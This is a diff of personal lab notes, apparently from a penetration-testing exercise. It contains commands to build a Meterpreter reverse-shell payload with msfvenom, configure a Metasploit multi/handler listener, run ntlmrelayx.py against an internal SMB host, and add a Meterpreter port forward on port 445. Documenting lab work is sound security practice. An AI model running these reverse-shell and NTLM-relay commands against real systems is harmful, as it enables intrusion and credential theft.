@@ -74,7 +74,7 @@ sc config lanmanworkstation start= disabled
 
 ![[Pasted image 20240907170321.png]]
 
-RESTART THE MACHINE
+>[!bug] Don't RESTART THE MACHINE Yet
 
 
 Now we have to configure the meterpreter shell through MSF console.
@@ -85,9 +85,49 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe > met
 
 Setup up the multi handler and run it 
 
+```
+use exploit/multi/handler
+```
+
+```
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+```
+set lhost tun0
+```
+
+```
+set lport 53
+```
+
+Run the payload in the .35 rdp before we restart the machine cuz last time it went down and we have to wait for 5 hours so that it get's reset.
+![[Pasted image 20240909014618.png]]
+
+![[Pasted image 20240909014646.png]]
+
+
 
 After than run the NTLMrelayx.py
 
 ```
 sudo ntlmrelayx.py -t smb://10.201.11.30 -smb2support -socks
 ```
+
+![[Pasted image 20240909014851.png]]
+
+```
+portfwd
+```
+
+```
+portfwd add -R -L 0.0.0.0 -l 445 -p 445
+```
+
+Will it tomorrow as we are getting this idea 
+```
+Failed to create relay: The address is already in use or unavailable: (:445).
+```
+
+
+
